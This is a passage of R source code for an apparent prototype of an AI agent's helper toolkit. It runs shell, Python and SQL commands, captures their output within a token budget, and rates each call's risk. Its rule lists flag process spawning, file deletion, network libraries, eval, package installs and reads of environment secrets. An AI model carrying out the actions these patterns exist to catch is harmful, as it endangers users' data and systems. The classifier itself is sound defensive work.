    lv = if (k %in% c("SELECT", "VALUES", "SHOW", "DESCRIBE", "EXPLAIN", "SUMMARIZE", "TABLE", "FROM")) 0L
         else if (k == "WITH") if (grepl("\\b(INSERT|UPDATE|DELETE|MERGE)\\b", S)) 2L else 0L
         else if (k == "PRAGMA") if (grepl("=", s)) 2L else 0L
         else if (k %in% c("INSERT", "UPDATE", "DELETE", "MERGE", "UPSERT", "REPLACE")) 2L
         else if (k == "CREATE") if (grepl("^CREATE\\s+(TEMP|TEMPORARY)\\b", S)) 1L else 2L
         else if (k %in% c("DROP", "TRUNCATE", "ALTER", "ATTACH", "DETACH", "GRANT", "REVOKE", "VACUUM",
                           "COPY", "EXPORT", "IMPORT", "INSTALL", "LOAD", "CALL", "SET", "RESET")) 3L
         else 3L
    if (lv == 0L && grepl("\\bINTO\\b", S)) lv = 2L
    f = rbind(f, flag(lv, if (lv == 0L) "read" else "db_write", paste(k, "statement")))
  }
  if (grepl("'(https?|s3|gs|az)://", q0, ignore.case = TRUE)) f = rbind(f, flag(2L, "network", "reads a URL"))
  if (!nrow(f)) f = flag(0L, "read", "empty")
  f
}

# ---------------------------------------------------------------- Python (token scan)
PY_RULES = list(
  list(3L, "process", "\\b(subprocess|os\\.system|os\\.popen|os\\.exec|os\\.spawn|pty\\.)"),
  list(3L, "file_delete", "\\b(os\\.remove|os\\.unlink|os\\.rmdir|shutil\\.rmtree|\\.unlink\\(|\\.rmdir\\(|os\\.removedirs)"),
  list(3L, "network", "\\b(requests|urllib|http\\.client|httpx|aiohttp|socket|ftplib|smtplib)\\b"),
  list(3L, "dynamic", "\\b(exec|eval|compile|__import__)\\s*\\(|\\bimportlib\\b"),
  list(3L, "package", "\\bpip\\b.*\\binstall\\b|py_require|ensurepip"),
  list(2L, "file_write", "open\\([^)]*['\"][wax]b?\\+?['\"]|\\.to_(csv|parquet|excel|json|pickle|feather|sql)\\(|write_(text|bytes)\\(|savefig\\(|np\\.save|pickle\\.dump|\\.save\\("),
  list(2L, "r_mutation", "\\br\\.[A-Za-z_][A-Za-z0-9_.]*\\s*=[^=]"),
  list(2L, "secrets", "os\\.environ|getenv\\(")
)
gptr_classify_py = function(code) {
  f = flag(1L, "python_state", "runs Python in the persistent session")
  for (r in PY_RULES) if (grepl(r[[3]], code, perl = TRUE)) f = rbind(f, flag(r[[1]], r[[2]], r[[2]]))
  f
}

# ---------------------------------------------------------------- R code: find bridge calls
bridge_name = function(fn) {
  # gptr$sh, gptr[["sh"]], gptr::gptr$sh
  if (!is.call(fn)) return(NULL)
  op = as.character(fn[[1L]])[1L]
  if (!op %in% c("$", "[[")) return(NULL)
  lhs = fn[[2L]]
  is_gw = identical(lhs, quote(gptr)) ||
    (is.call(lhs) && identical(as.character(lhs[[1L]])[1L], "::") && identical(as.character(lhs[[3L]]), "gptr"))
  if (!is_gw) return(NULL)
  as.character(fn[[3L]])
}
literal_arg = function(call, pos, name) {
  args = as.list(call)[-1L]
  nms = names(args) %||% rep("", length(args))
  v = if (name %in% nms) args[[match(name, nms)]] else { un = args[!nzchar(nms)]; if (length(un) >= pos) un[[pos]] else NULL }
  if (is.character(v)) return(v)
  if (is.call(v) && identical(v[[1L]], quote(c)) && all(vapply(as.list(v)[-1L], is.character, NA)))
    return(unlist(as.list(v)[-1L]))
  structure(NA_character_, computed = TRUE)
}
BRIDGE_CLASSIFIERS = list(
  sh = function(call, root) {
    x = literal_arg(call, 1L, "cmd")
    if (isTRUE(attr(x, "computed"))) return(flag(3L, "computed_command", "command built at run time"))
    gptr_classify_cmd(x, root)
  },
  bg = function(call, root) BRIDGE_CLASSIFIERS$sh(call, root),
  script = function(call, root) {
    x = literal_arg(call, 1L, "path")
    if (isTRUE(attr(x, "computed")) || !file.exists(x)) return(flag(3L, "exec", "script"))
    ext = tolower(tools::file_ext(x))
    if (ext %in% c("sh", "bash", "zsh")) {
      body = readLines(x, warn = FALSE)
      body = body[!grepl("^\\s*(#|$)", body)]
      f = do.call(rbind, lapply(body, gptr_classify_cmd, root = root))
      return(rbind(flag(1L, "exec", paste("shell script", basename(x))), f))
    }
    flag(3L, "exec", paste("script", basename(x)))
  },
  py = function(call, root) {
    x = literal_arg(call, 1L, "code")
    if (isTRUE(attr(x, "computed"))) return(flag(3L, "dynamic", "Python code built at run time"))
    gptr_classify_py(paste(x, collapse = "\n"))
  },
  sql = function(call, root) {
    x = literal_arg(call, 1L, "query")
    if (isTRUE(attr(x, "computed"))) return(flag(3L, "db_write", "SQL built at run time"))
    gptr_classify_sql(paste(x, collapse = "\n"))
  },
  knit = function(call, root) {
    eng = literal_arg(call, 1L, "engine"); code = literal_arg(call, 2L, "code")
    if (isTRUE(attr(code, "computed")) || isTRUE(attr(eng, "computed"))) return(flag(3L, "dynamic", "engine code built at run time"))
    code = paste(code, collapse = "\n")
    switch(eng, bash = , sh = , zsh = gptr_classify_cmd(code, root), python = gptr_classify_py(code),
           sql = gptr_classify_sql(code), flag(3L, "exec", paste("knitr engine", eng)))
  },
  jobs = function(call, root) flag(0L, "read", "list jobs")
)
# Base-R process calls with literal arguments get the same command classifier.
PROCESS_CALLS = c("system", "system2", "run", "shell")
gptr_classify_bridges = function(code, root = getwd()) {
  ex = tryCatch(parse(text = code, keep.source = FALSE), error = function(e) NULL)
  if (is.null(ex)) return(flag(3L, "parse_error", "code does not parse"))
  f = no_flags()
  walk = function(e) {
    if (!is.call(e)) return(invisible())
    b = bridge_name(e[[1L]])
    if (!is.null(b)) {
      cl = BRIDGE_CLASSIFIERS[[b]]
      f <<- rbind(f, if (is.null(cl)) flag(3L, "unknown_bridge", b) else cl(e, root))
    } else {
      head = e[[1L]]
      nm = if (is.symbol(head)) as.character(head) else if (is.call(head) && identical(as.character(head[[1L]])[1L], "::")) as.character(head[[3L]]) else ""
      if (nm %in% PROCESS_CALLS) {
        a = as.list(e)[-1L]
        if (length(a) && is.character(a[[1L]])) {
          cmd = if (nm == "system2" || nm == "run") {
            rest = if (length(a) >= 2L && (is.character(a[[2L]]) || (is.call(a[[2L]]) && identical(a[[2L]][[1L]], quote(c))))) unlist(as.list(a[[2L]])[if (is.call(a[[2L]])) -1L else TRUE]) else character()
            if (all(vapply(rest, is.character, NA))) c(a[[1L]], unlist(rest)) else NA
          } else a[[1L]]
          if (!anyNA(cmd)) f <<- rbind(f, cbind(gptr_classify_cmd(cmd, root)[, 1:2], what = paste0(nm, "(): ", gptr_classify_cmd(cmd, root)$what)))
        }
      }
    }
    for (a in as.list(e)[-1L]) if (is.call(a)) walk(a)
  }
  for (e in ex) walk(e)
  f
}
risk_summary = function(f) {
  if (!nrow(f)) return("level 0 (no helper calls)")
  lv = max(f$level)
  top = f[f$level == lv, , drop = FALSE]
  sprintf("level %d [%s]", lv, paste(unique(paste0(top$category, ": ", top$what)), collapse = "; "))
}
````

### `g5_helpers.R`

````r
# g5_helpers.R -- prototype of gptr's polyglot glue helpers (research track G5).
# Base R + processx (Imports); reticulate, DBI, duckdb, knitr are optional (Suggests).
# House style (S-9): "=" for assignment, native pipe. ASCII-only source.
# Every helper is a "bridge" registered through one registration call (S-11) and reached
# through the gateway as gptr$<name>(...).

`%||%` = function(a, b) if (is.null(a)) b else a

G5 = new.env(parent = emptyenv())
G5$bridges = list()
G5$interpreters = list()
G5$jobs = list()
G5$job_seq = 0L
G5$spills = character()
G5$secret_vars = character()          # names gptr loaded from .env files; never passed to children
# tokens per byte class, fitted against o200k_base on command/R output (p11; held-out median error ~0%)
G5$tok_coef = c(alpha = 0.1355, digit = 0.8104, space = 0.0938, punct = 0.677, newline = 1.6367, nonascii = 0.3333)
G5$default_tokens = 1500L             # print budget per helper result
G5$budget_safety = 0.85               # estimator p95 error is ~22% (p11)
G5$max_line_chars = 400L
G5$max_spills = 50L

# ------------------------------------------------------------------ registry (plugin API shape)
gptr_register_bridge = function(name, fun, classify = NULL, record = NULL, describe = "") {
  stopifnot(is.character(name), length(name) == 1L, is.function(fun))
  G5$bridges[[name]] = list(name = name, fun = fun, classify = classify, record = record,
                            describe = describe)
  invisible(name)
}
gptr_register_interpreter = function(ext, candidates, args = character(), windows_only = FALSE) {
  G5$interpreters[[tolower(ext)]] = list(candidates = candidates, args = args,
                                         windows_only = windows_only)
  invisible(ext)
}

# The gateway: one function (S-1) that is also the namespace of helpers (gptr$sh, gptr$py, ...).
gptr = structure(function(...) stop("agent loop not part of this prototype"),
                 class = c("gptr_gateway", "function"))
`$.gptr_gateway` = function(x, name) {
  b = G5$bridges[[name]]
  if (is.null(b)) stop(sprintf("gptr$%s: no such helper. Available: %s", name,
                               paste(names(G5$bridges), collapse = ", ")), call. = FALSE)
  b$fun
}
`[[.gptr_gateway` = function(x, i, ...) `$.gptr_gateway`(x, i)
.DollarNames.gptr_gateway = function(x, pattern = "") grep(pattern, names(G5$bridges), value = TRUE)
print.gptr_gateway = function(x, ...) {
  cat("<gptr gateway> helpers:", paste(names(G5$bridges), collapse = ", "), "\n")
  invisible(x)
}

# ------------------------------------------------------------------ text utilities
is_windows = function() identical(.Platform$OS.type, "windows")

decode_bytes = function(b) {
  if (length(b) >= 3L && identical(b[1:3], as.raw(c(0xef, 0xbb, 0xbf)))) b = b[-(1:3)]
  if (!length(b)) return(enc_utf8(""))
  if (any(b[seq_len(min(length(b), 8000L))] == as.raw(0L))) {
    return(structure(enc_utf8(sprintf("[binary output: %d bytes]", length(b))), binary = TRUE))
  }
  x = rawToChar(b)
  if (validUTF8(x)) return(enc_utf8(x))
  # Fallback: Windows system ANSI code page (R >= 4.2 reports it), else latin1.
  cp = if (is_windows()) paste0("CP", l10n_info()[["system.codepage"]] %||% 1252L) else "latin1"
  y = iconv(x, cp, "UTF-8", sub = "?")
  if (is.na(y)) y = iconv(x, "latin1", "UTF-8")
  enc_utf8(y)
}
enc_utf8 = function(x) { Encoding(x) = "UTF-8"; x }

clean_text = function(x) {
  x = gsub("\r\n", "\n", x, fixed = TRUE)
  x = gsub("\033\\[[0-?]*[ -/]*[@-~]", "", x, perl = TRUE)            # ANSI CSI (colour, cursor)
  x = gsub("\033\\][^\007\033]*(\007|\033\\\\)", "", x, perl = TRUE)  # OSC (hyperlinks, titles)
  x = gsub("[^\n\r]*\r", "", x, perl = TRUE)                          # \r progress: keep last frame
  enc_utf8(x)
}

est_tokens = function(x) {
  x = paste(x, collapse = "\n")
  f = c(alpha = nchar(gsub("[^A-Za-z]", "", x), "bytes"), digit = nchar(gsub("[^0-9]", "", x), "bytes"),
        space = nchar(gsub("[^ \t]", "", x), "bytes"),
        punct = nchar(gsub("[A-Za-z0-9 \t\n]|[^\\x01-\\x7f]", "", x, perl = TRUE), "bytes"),
        newline = lengths(regmatches(x, gregexpr("\n", x, fixed = TRUE))) + 1,
        nonascii = nchar(gsub("[\\x01-\\x7f]", "", x, perl = TRUE), "bytes"))
  ceiling(sum(f * G5$tok_coef[names(f)]))
}

read_span = function(path, from, n) {
  con = file(path, "rb")
  on.exit(close(con))
  if (from > 0) seek(con, from)
  readBin(con, "raw", n)
}
count_newlines = function(path, chunk = 4194304L) {
  con = file(path, "rb")
  on.exit(close(con))
  n = 0
  repeat {
    r = readBin(con, "raw", chunk)
    if (!length(r)) break
    n = n + sum(r == as.raw(10L))
  }
  n
}
cap_lines = function(lines, max_chars = G5$max_line_chars) {
  long = nchar(lines, type = "chars", allowNA = TRUE) > max_chars
  long[is.na(long)] = FALSE
  if (any(long)) {
    extra = nchar(lines[long]) - max_chars
    lines[long] = paste0(substr(lines[long], 1L, max_chars), sprintf(" ...[+%d chars]", extra))
  }
  lines
}

# Budgeted head+tail view of a file (reads only the bytes it shows; works for GB outputs).
budget_view = function(path, max_tokens = G5$default_tokens, head_frac = 0.4, handle = NULL) {
  size = if (is.null(path) || !file.exists(path)) 0 else file.size(path)
  if (size == 0) return(list(text = character(), truncated = FALSE, lines = 0, bytes = 0))
  # token density of this output (digits and punctuation cost more than prose)
  smp = decode_bytes(read_span(path, 0, min(size, 65536)))
  if (size > 65536) smp = paste(smp, decode_bytes(read_span(path, size - 65536, 65536)))
  per_byte = max(est_tokens(smp) / max(nchar(smp, "bytes"), 1), 0.05)
  max_bytes = floor(G5$budget_safety * max_tokens / per_byte)  # stay within budget at the estimator's p95
  if (size <= max_bytes) {
    txt = clean_text(decode_bytes(read_span(path, 0, size)))
    lines = strsplit(txt, "\n", fixed = TRUE)[[1]]
    lines = cap_lines(lines)
    if (est_tokens(paste(lines, collapse = "\n")) <= max_tokens)
      return(list(text = lines, truncated = FALSE, lines = length(lines), bytes = size))
  }
  hb = floor(max_bytes * head_frac)
  tb = max_bytes - hb
  head = clean_text(decode_bytes(read_span(path, 0, hb)))
  tail = clean_text(decode_bytes(read_span(path, max(0, size - tb), tb)))
  hl = strsplit(head, "\n", fixed = TRUE)[[1]]
  tl = strsplit(tail, "\n", fixed = TRUE)[[1]]
  if (length(hl) > 1L) hl = hl[-length(hl)]           # drop partial last line of the head
  if (length(tl) > 1L && size > tb) tl = tl[-1L]       # drop partial first line of the tail
  total = count_newlines(path)
  omitted = max(0, total - length(hl) - length(tl))
  note = sprintf("[... %s lines omitted (%s total, %s); all: %s]",
                 format(omitted, big.mark = ","), format(total, big.mark = ","),
                 fmt_bytes(size), handle %||% path)
  list(text = c(cap_lines(hl), note, cap_lines(tl)), truncated = TRUE, lines = total,
       bytes = size)
}
fmt_bytes = function(b) {
  if (b < 1024) sprintf("%dB", as.integer(b))
  else if (b < 1024^2) sprintf("%.1fKB", b / 1024)
  else sprintf("%.1fMB", b / 1024^2)
}
new_spill = function(prefix) {
  f = tempfile(paste0("gptr-", prefix, "-"), fileext = ".log")  # tempfile(): no RNG use
  G5$spills = c(G5$spills, f)
  if (length(G5$spills) > G5$max_spills) {
    old = G5$spills[seq_len(length(G5$spills) - G5$max_spills)]
    unlink(old)
    G5$spills = setdiff(G5$spills, old)
  }
  f
}

# ------------------------------------------------------------------ child environment
child_env = function(extra = NULL) {
  e = Sys.getenv()
  e = stats::setNames(as.character(e), names(e))
  e = e[setdiff(names(e), G5$secret_vars)]
  fixed = c(NO_COLOR = "1", CLICOLOR = "0", TERM = "dumb", PAGER = "cat", GIT_PAGER = "cat",
            GIT_TERMINAL_PROMPT = "0", PYTHONIOENCODING = "utf-8", PYTHONUNBUFFERED = "1")
  e[names(fixed)] = fixed
  if (length(extra)) e[names(extra)] = as.character(extra)
  e
}

# ------------------------------------------------------------------ shell resolution
gptr_shell_resolve = function(shell = getOption("gptr.shell")) {
  mk = function(path, args, name, kind) list(path = path, args = args, name = name, kind = kind)
  ps_args = c("-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-EncodedCommand")
  if (!is.null(shell)) {
    s = tolower(basename(shell))
    if (grepl("^(pwsh|powershell)", s)) return(mk(Sys.which(shell) %||% shell, ps_args, "PowerShell", "powershell"))
    if (grepl("^cmd", s)) return(mk(Sys.getenv("COMSPEC", "cmd.exe"), c("/d", "/s", "/c"), "cmd.exe", "cmd"))
    p = if (file.exists(shell)) shell else unname(Sys.which(shell))
    if (!nzchar(p)) stop(sprintf("shell not found: %s", shell), call. = FALSE)
    return(mk(p, "-c", basename(shell), "posix"))
  }
  if (is_windows()) {
    roots = c(Sys.getenv("ProgramFiles"), Sys.getenv("ProgramW6432"), Sys.getenv("ProgramFiles(x86)"),
              file.path(Sys.getenv("LOCALAPPDATA"), "Programs"))
    gb = file.path(roots[nzchar(roots)], "Git", "bin", "bash.exe")
    gb = gb[file.exists(gb)]
    if (length(gb)) return(mk(gb[1L], "-c", "bash (Git Bash)", "posix"))
    # never System32\bash.exe (the WSL launcher: other file system, other PATH)
    for (ps in c("pwsh.exe", "powershell.exe")) {
      p = unname(Sys.which(ps))
      if (nzchar(p)) return(mk(p, ps_args, "PowerShell", "powershell"))
    }
    return(mk(Sys.getenv("COMSPEC", "cmd.exe"), c("/d", "/s", "/c"), "cmd.exe", "cmd"))
  }
  if (file.exists("/bin/bash")) return(mk("/bin/bash", "-c", "bash", "posix"))
  b = unname(Sys.which("bash"))
  if (nzchar(b)) return(mk(b, "-c", "bash", "posix"))
  mk("/bin/sh", "-c", "sh", "posix")
}

# argv for running a shell string with the resolved shell
shell_argv = function(cmd, sh) {
  switch(sh$kind,
    posix = c(sh$path, sh$args, cmd),
    powershell = {
      pre = "try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch {}\n"
      post = "\n$gptr_ok = $?; if ($LASTEXITCODE) { exit $LASTEXITCODE }; if (-not $gptr_ok) { exit 1 }"
      c(sh$path, sh$args, ps_encode(paste0(pre, cmd, post)))
    },
    cmd = structure(c(sh$path, sh$args, paste0("\"chcp 65001 >nul & ", cmd, "\"")), verbatim = TRUE))
}
# PowerShell -EncodedCommand: base64 of UTF-16LE (no quoting problems at all)
ps_encode = function(x) {
  b = iconv(enc2utf8(x), "UTF-8", "UTF-16LE", toRaw = TRUE)[[1]]
  gsub("\n", "", jsonlite::base64_enc(b), fixed = TRUE)
}

# POSIX-style word splitting of a *simple* command; NULL when shell syntax is present.
sh_split = function(cmd) {
  if (grepl("^\\s*[A-Za-z_][A-Za-z0-9_]*=", cmd)) return(NULL)      # VAR=value cmd
  ch = strsplit(cmd, "", fixed = TRUE)[[1]]
  meta = c("|", "&", ";", "<", ">", "(", ")", "$", "`", "*", "?", "[", "]", "{", "}", "!", "\n", "\r")
  out = character(); cur = ""; has = FALSE; q = ""; i = 1L; n = length(ch)
  while (i <= n) {
    c1 = ch[i]
    if (q == "'") {
      if (c1 == "'") q = "" else cur = paste0(cur, c1)
    } else if (q == "\"") {
      if (c1 == "\"") q = ""
      else if (c1 %in% c("$", "`", "\\")) return(NULL)
      else cur = paste0(cur, c1)
    } else if (c1 %in% c(" ", "\t")) {
      if (has) { out = c(out, cur); cur = ""; has = FALSE }
    } else if (c1 %in% c("'", "\"")) {
      q = c1; has = TRUE
    } else if (c1 %in% meta || c1 == "\\" ||
               (!has && c1 %in% c("~", "#"))) {
      return(NULL)
    } else {
      cur = paste0(cur, c1); has = TRUE
    }
    i = i + 1L
  }
  if (nzchar(q)) return(NULL)
  if (has) out = c(out, cur)
  if (length(out)) out else NULL
}

# Resolve a command given as argv (length > 1) or as one string.
resolve_command = function(cmd, shell = NULL) {
  if (length(cmd) > 1L || isTRUE(attr(cmd, "argv"))) {
    return(list(argv = resolve_program(cmd), via = "argv", label = paste(cmd, collapse = " ")))
  }
  if (is.null(shell)) {
    w = sh_split(cmd)
    if (!is.null(w) && nzchar(Sys.which(w[1L])) && !is_batch(Sys.which(w[1L])))
      return(list(argv = resolve_program(w), via = "direct", label = cmd))
  }
  sh = gptr_shell_resolve(if (isFALSE(shell) || isTRUE(shell)) NULL else shell)
  argv = shell_argv(cmd, sh)
  list(argv = argv, via = sh$name, label = cmd, verbatim = isTRUE(attr(argv, "verbatim")))
}
is_batch = function(p) grepl("\\.(cmd|bat)$", p, ignore.case = TRUE)
resolve_program = function(argv) {
  p = unname(Sys.which(argv[1L]))
  if (!nzchar(p)) {
    if (file.exists(argv[1L])) p = argv[1L]
    else stop(sprintf("program not found on PATH: %s", argv[1L]), call. = FALSE)
  }
  if (is_batch(p)) {
    # Windows batch shim: cmd.exe re-parses the command line (BatBadBut class). Refuse metachars.
    bad = grepl("[%^&|<>\"!\r\n]", argv[-1L])
    if (any(bad)) stop(sprintf("refusing to pass %s to batch file %s; use the string form",
                               paste(shQuote(argv[-1L][bad]), collapse = ", "), basename(p)), call. = FALSE)
    return(c(Sys.getenv("COMSPEC", "cmd.exe"), "/d", "/c", "call", p, argv[-1L]))
  }
  c(p, argv[-1L])
}

# ------------------------------------------------------------------ process engine
write_input_file = function(input) {
  f = tempfile("gptr-in-")
  txt = if (is.data.frame(input)) {
    tc = textConnection("csv_out", "w", local = TRUE)
    utils::write.csv(input, tc, row.names = FALSE)
    close(tc)
    paste0(paste(csv_out, collapse = "\n"), "\n")
  } else if (is.raw(input)) NULL else paste0(paste(as.character(input), collapse = "\n"), "\n")
  con = file(f, "wb")
  writeBin(if (is.raw(input)) input else charToRaw(enc2utf8(txt)), con)
  close(con)
  f
}

# Strings handed to the OS: UTF-8 bytes without an encoding mark. processx translates
# UTF-8-marked strings to the native encoding, which in a C locale turns e-acute into "<U+00E9>".
os_bytes = function(x) {
  x = as.character(x)
  lat = Encoding(x) == "latin1"
  x[lat] = enc2utf8(x[lat])
  Encoding(x) = "unknown"
  x
}
# kill_tree() finds descendants through an environment marker; on macOS the environment of
# SIP-protected /bin binaries is unreadable, so it can miss them. $kill() signals the child's
# process group on Unix, so call both. On Windows taskkill /T walks the tree by parent pid,
# so it must run while the parent is still alive (before $kill()).
kill_all = function(p) {
  try(p$kill_tree(), silent = TRUE)
  if (is_windows() && p$is_alive())
    try(processx::run(file.path(Sys.getenv("SystemRoot", "C:/Windows"), "System32", "taskkill.exe"),
                      c("/F", "/T", "/PID", p$get_pid()), error_on_status = FALSE), silent = TRUE)
  try(p$kill(), silent = TRUE)
  invisible(p)
}

proc_start = function(argv, wd, env, stdin, out_f, err_f, supervise = FALSE, verbatim = FALSE) {
  argv = os_bytes(argv)
  env = stats::setNames(os_bytes(env), names(env))
  processx::process$new(argv[1L], argv[-1L], wd = os_bytes(wd), env = env, stdin = stdin,
                         stdout = out_f, stderr = if (is.null(err_f)) "2>&1" else err_f,
                         cleanup = TRUE, cleanup_tree = TRUE, windows_hide_window = TRUE,
                         windows_verbatim_args = verbatim,  # cmd.exe /s /c "<line>": no MSVCRT quoting
                         supervise = supervise)
}

G5$out_seq = 0L; G5$outs = list()
remember = function(x) {                       # short handle for truncation notices: gptr$out(<id>)
  G5$out_seq = G5$out_seq + 1L
  attr(x, "id") = G5$out_seq
  G5$outs[[as.character(G5$out_seq)]] = x
  if (length(G5$outs) > 20L) G5$outs = G5$outs[-1L]
  x
}
g5_out = function(id = G5$out_seq) {
  x = G5$outs[[as.character(id)]]
  if (is.null(x)) stop(sprintf("no helper result %s (the last 20 are kept)", id), call. = FALSE)
  x
}
new_cmd_result = function(label, via, argv, status, timed_out, secs, out_f, err_f, wd) {
  remember(structure(list(cmd = label, via = via, argv = argv, status = status, timed_out = timed_out,
                          seconds = round(secs, 2), files = c(stdout = out_f, stderr = err_f %||% NA),
                          wd = wd), class = "gptr_cmd"))
}

# gptr$sh(): run a command (argv vector or one string) and capture UTF-8 stdout/stderr.
g5_sh = function(cmd, input = NULL, wd = ".", timeout = 120, env = NULL, shell = NULL,
                 merge = FALSE, check = FALSE, echo = FALSE, max_tokens = NULL) {
  r = resolve_command(cmd, shell)
  out_f = new_spill("out")
  err_f = if (merge) NULL else new_spill("err")
  in_f = if (!is.null(input)) write_input_file(input) else NULL
  if (!is.null(in_f)) on.exit(unlink(in_f), add = TRUE)
  t0 = proc.time()[["elapsed"]]
  p = proc_start(r$argv, normalizePath(wd), child_env(env), in_f, out_f, err_f, verbatim = isTRUE(r$verbatim))
  on.exit(if (p$is_alive()) kill_all(p), add = TRUE)       # Ctrl-C / error: kill the whole tree
  timed_out = FALSE
  shown = 0
  repeat {
    p$wait(200)
    if (echo) shown = echo_new(out_f, shown)
    if (!p$is_alive()) break
    if (proc.time()[["elapsed"]] - t0 > timeout) {
      timed_out = TRUE
      kill_all(p)
      break
    }
  }
  status = if (timed_out) NA_integer_ else p$get_exit_status()
  res = new_cmd_result(r$label, r$via, r$argv, status, timed_out, proc.time()[["elapsed"]] - t0,
                       out_f, err_f, wd)
  attr(res, "max_tokens") = max_tokens
  if (check && (timed_out || !identical(status, 0L))) {
    stop(structure(class = c("gptr_error_command", "gptr_error", "error", "condition"),
                   list(message = paste(format(res), collapse = "\n"), call = NULL, result = res)))
  }
  res
}
echo_new = function(path, shown) {
  sz = file.size(path)
  if (!is.na(sz) && sz > shown) cat(decode_bytes(read_span(path, shown, sz - shown)), file = stderr())
  if (is.na(sz)) shown else sz
}

# Lazy access: r$stdout / r$stderr are character vectors of lines, r$text one string.
`$.gptr_cmd` = function(x, name) {
  f = .subset2(x, "files")
  read_lines = function(p) {
    if (is.na(p) || !file.exists(p)) return(character())
    s = clean_text(decode_bytes(read_span(p, 0, file.size(p))))
    if (!nzchar(s)) character() else strsplit(sub("\n$", "", s), "\n", fixed = TRUE)[[1]]
  }
  switch(name,
    stdout = read_lines(f[["stdout"]]),
    stderr = read_lines(f[["stderr"]]),
    text = paste(read_lines(f[["stdout"]]), collapse = "\n"),
    ok = isTRUE(.subset2(x, "status") == 0L),
    .subset2(x, name))
}
format.gptr_cmd = function(x, max_tokens = NULL, ...) {
  mt = max_tokens %||% attr(x, "max_tokens") %||% G5$default_tokens
  f = .subset2(x, "files")
  id = attr(x, "id")
  err_exists = !is.na(f[["stderr"]]) && file.exists(f[["stderr"]]) && file.size(f[["stderr"]]) > 0
  e = if (err_exists) budget_view(f[["stderr"]], max(200, floor(mt * 0.25)), head_frac = 0.2,
                                  handle = sprintf("gptr$out(%s)$stderr", id))
  used = if (err_exists) est_tokens(e$text) else 0
  o = budget_view(f[["stdout"]], max(100, mt - used), handle = sprintf("gptr$out(%s)$stdout", id))
  lines = o$text
  if (err_exists) lines = c(lines, "[stderr]", e$text)
  st = .subset2(x, "status")
  if (isTRUE(.subset2(x, "timed_out")))
    lines = c(lines, sprintf("[timed out after %ss; process tree killed]", .subset2(x, "seconds")))
  else if (!identical(st, 0L)) lines = c(lines, sprintf("[exit %s]", st))
  if (!length(lines)) lines = "(no output)"
  lines
}
out_lines = function(lines) writeLines(os_bytes(lines), useBytes = TRUE)  # UTF-8 bytes even in a C locale
print.gptr_cmd = function(x, ...) {
  out_lines(format(x, ...))
  invisible(x)
}
as.character.gptr_cmd = function(x, ...) x$stdout

# ------------------------------------------------------------------ scripts by extension
g5_script = function(path, args = character(), ..., interpreter = NULL) {
  if (!file.exists(path)) stop(sprintf("script not found: %s", path), call. = FALSE)
  argv = interpreter %||% interpreter_for(path)
  if (is_batch(path) && any(grepl("[%^&|<>\"!\r\n]", args)))     # cmd.exe re-parses (BatBadBut)
    stop("refusing cmd.exe metacharacters in arguments to a batch script", call. = FALSE)
  g5_sh(structure(c(argv, path, args), argv = TRUE), ...)
}
interpreter_for = function(path) {
  ext = tolower(tools::file_ext(path))
  spec = G5$interpreters[[ext]]
  if (!is.null(spec)) {
    if (spec$windows_only && !is_windows()) stop(sprintf(".%s scripts run only on Windows", ext), call. = FALSE)
    for (cand in spec$candidates) {
      if (identical(cand, "<shell>")) {
        sh = gptr_shell_resolve()
        if (sh$kind == "posix") return(c(sh$path, spec$args))
        next
      }
      p = if (file.exists(cand)) cand else unname(Sys.which(cand))
      if (nzchar(p)) return(c(p, spec$args))
    }
    stop(sprintf("no interpreter found for .%s (tried %s)", ext, paste(spec$candidates, collapse = ", ")), call. = FALSE)
  }
  first = readLines(path, n = 1L, warn = FALSE)
  if (length(first) && startsWith(first, "#!")) {
    w = strsplit(trimws(sub("^#!", "", first)), "\\s+")[[1]]
    if (basename(w[1L]) == "env") w = w[-1L]
    p = unname(Sys.which(basename(w[1L])))
    if (nzchar(p)) return(c(p, w[-1L]))
  }
  stop(sprintf("don't know how to run %s; pass interpreter =", basename(path)), call. = FALSE)
}

# ------------------------------------------------------------------ background jobs
g5_bg = function(cmd, input = NULL, wd = ".", env = NULL, shell = NULL, stdin = FALSE,
                 merge = TRUE, name = NULL) {
  r = resolve_command(cmd, shell)
  out_f = new_spill("job")
  err_f = if (merge) NULL else new_spill("joberr")
  in_spec = if (stdin) "|" else if (!is.null(input)) write_input_file(input) else NULL
  p = proc_start(r$argv, normalizePath(wd), child_env(env), in_spec, out_f, err_f,
                 supervise = isTRUE(getOption("gptr.supervise", TRUE)), verbatim = isTRUE(r$verbatim))
  G5$job_seq = G5$job_seq + 1L
  job = new.env(parent = emptyenv())
  job$id = name %||% sprintf("job%d", G5$job_seq)
  job$cmd = substr(gsub("\\s+", " ", r$label), 1L, 60L); job$p = p; job$out = out_f; job$err = err_f
  job$pos = 0; job$started = Sys.time()
  job$read = function(max_tokens = 800) job_read(job, max_tokens)
  job$wait = function(timeout = 30, until = NULL, max_tokens = 800) job_wait(job, timeout, until, max_tokens)
  job$kill = function() { kill_all(job$p); invisible(job) }
  job$write = function(text) job_write(job, text)
  job$status = function() job_status(job)
  class(job) = "gptr_job"
  G5$jobs[[job$id]] = job
  job
}
job_status = function(j) {
  if (j$p$is_alive()) "running" else sprintf("exited %s", j$p$get_exit_status())
}
job_read = function(j, max_tokens = 800) {
  sz = file.size(j$out)
  if (is.na(sz) || sz <= j$pos) {
    out = sprintf("[%s %s; no new output]", j$id, job_status(j))
  } else {
    tmp = tempfile()
    con = file(tmp, "wb"); writeBin(read_span(j$out, j$pos, sz - j$pos), con); close(con)
    v = budget_view(tmp, max_tokens, head_frac = 0.2, handle = j$out)   # notice points at the job log
    unlink(tmp)
    j$pos = sz
    out = c(v$text, sprintf("[%s %s, %.0fs]", j$id, job_status(j),
                            as.numeric(difftime(Sys.time(), j$started, units = "secs"))))
  }
  structure(out, class = "gptr_text")
}
job_wait = function(j, timeout = 30, until = NULL, max_tokens = 800) {
  t0 = proc.time()[["elapsed"]]
  repeat {
    j$p$wait(200)
    if (!j$p$is_alive()) break
    if (!is.null(until)) {
      sz = file.size(j$out)
      if (!is.na(sz) && sz > j$pos &&
          grepl(until, decode_bytes(read_span(j$out, j$pos, sz - j$pos)), perl = TRUE)) break
    }
    if (proc.time()[["elapsed"]] - t0 > timeout) break
  }
  job_read(j, max_tokens)
}
job_write = function(j, text) {
  rest = charToRaw(enc2utf8(paste0(paste(text, collapse = "\n"), "\n")))
  deadline = proc.time()[["elapsed"]] + 30
  while (length(rest)) {                         # write_input() is non-blocking (report 08)
    rest = j$p$write_input(rest)
    if (!length(rest)) break
